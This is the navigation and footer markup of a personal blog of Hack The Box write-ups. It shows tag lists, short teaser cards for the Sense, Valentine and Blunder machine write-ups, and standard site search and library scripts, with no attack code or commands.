Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/cryptography/">Cryptography</a> <a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/miscellaneous/">Miscellaneous</a> <a class="post-tag" href="/tags/web/">Web</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Sense-Hack-The-Box-Write-up/"><div class="card-body"> <em class="small" data-ts="1612245600" data-df="ll" > Feb 2, 2021 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Sense — Hack The Box [Write-up]</h3><div class="text-muted small"><p> Sense, while not requiring many steps to complete, can be challenging for some as it is all about enumeration which takes long time for me then every thing goes easy as we will see. Used Tools: ...</p></div></div></a></div><div class="card"> <a href="/posts/Valentine-Hack-The-Box-Write-up/"><div class="card-body"> <em class="small" data-ts="1612533600" data-df="ll" > Feb 5, 2021 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Valentine — Hack The Box [Write-up]</h3><div class="text-muted small"><p> Valentine is a very unique machine which focuses on the Heartbleed vulnerability, which had devastating impact on systems across the globe. Skills Required: Beginner/Intermediate knowledge of...</p></div></div></a></div><div class="card"> <a href="/posts/Blunder-Hack-The-Box-Write-up/"><div class="card-body"> <em class="small" data-ts="1651381200" data-df="ll" > May 1, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Blunder — Hack The Box [Write-up]</h3><div class="text-muted small"><p> Blunder is a Linux machine rated as easy from Hack The Box, it consists on finding credentials to log in to Bludit and then use a RCE exploit to gain an initial shell, then some database files ca...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Poison-Hack-The-Box-Write-up/" class="btn btn-outline-primary" prompt="Older"><p>Poison — Hack The Box [Write-up]</p></a> <a href="/posts/Nest-Hack-The-Box-Write-up/" class="btn btn-outline-primary" prompt="Newer"><p>Nest — Hack The Box [Write-up]</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/username">Antony Magdy</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/cryptography/">Cryptography</a> <a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/miscellaneous/">Miscellaneous</a> <a class="post-tag" href="/tags/web/">Web</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
